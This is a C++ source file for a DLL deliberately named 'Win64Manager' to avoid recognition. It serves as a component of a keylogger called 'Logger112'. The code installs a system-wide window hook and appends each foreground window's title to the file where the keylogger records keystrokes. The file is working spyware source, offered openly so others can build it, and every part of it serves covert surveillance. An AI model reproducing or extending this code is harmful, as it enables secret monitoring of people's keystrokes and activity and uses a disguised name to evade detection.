// dllmain.cpp : Defines the entry point for the DLL application.
//This is the code for the dll file Win64Manager, I named it that to avoid recognition
/*This file is not part of the Logger112 solution, I included it in case someone might want to build the Win64Manager.dll themselves. The Win64Manager.dll file is required
for Logger112 to function properly as it installs system wide hook to listen for change in foreground window*/
#include "pch.h"
#include <windows.h>
#include <iostream>
#include <fstream>

HHOOK wndhook = NULL;



LRESULT CALLBACK llWindowProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_ACTIVATE) {
        HWND hwnd = (HWND)wParam;
        char windowName[256] = { 0 };

  
        if (GetWindowTextA(hwnd, windowName, sizeof(windowName) / sizeof(char))) {
           
            std::ofstream outFile;
            outFile.open("./window_titles.txt", std::ios::app);  // This needs to be an absolute path to the file where Logger112 logs keystrokes

            if (outFile.is_open()) {
                outFile << "\n";
                outFile << "The window has changed to: " << windowName << std::endl;
                outFile.close();  
            }
        }
    }

    return CallNextHookEx(wndhook, nCode, wParam, lParam);
}

extern "C" __declspec(dllexport) void InstallHook(HINSTANCE hInstance) {
    wndhook = SetWindowsHookEx(WH_CBT, llWindowProc, hInstance, 0);
}

extern "C" __declspec(dllexport) void UninstallHook() {
    if (wndhook) {
        UnhookWindowsHookEx(wndhook);
        wndhook = NULL;
    }
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

